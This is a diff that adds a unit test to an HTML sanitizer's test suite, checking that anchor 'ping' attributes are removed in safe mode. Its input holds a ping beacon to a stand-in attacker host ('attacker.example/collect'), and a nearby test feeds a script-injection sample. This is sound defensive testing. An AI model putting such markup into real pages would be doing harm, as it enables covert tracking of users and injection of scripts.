@@ -51,6 +51,13 @@ describe('sanitizeHtmlContent', () => {
     expect(html).not.toContain('rel="opener')
   })
 
+  it('drops ping from raw HTML anchors', () => {
+    const html = sanitizeHtmlContent('<a href="https://example.com" ping="https://attacker.example/collect">x</a>', 'safe')
+
+    expect(html).toContain('href="https://example.com"')
+    expect(html).not.toContain('ping=')
+  })
+
   it('can preserve broader HTML tags for trusted content', () => {
     const html = sanitizeHtmlContent('<iframe src="https://example.com"></iframe><style>body{color:red}</style><span style="color:red">Styled</span><video src="clip.mp4"></video><html><body>Doc</body></html><script>alert(1)</script>', 'trusted')
 
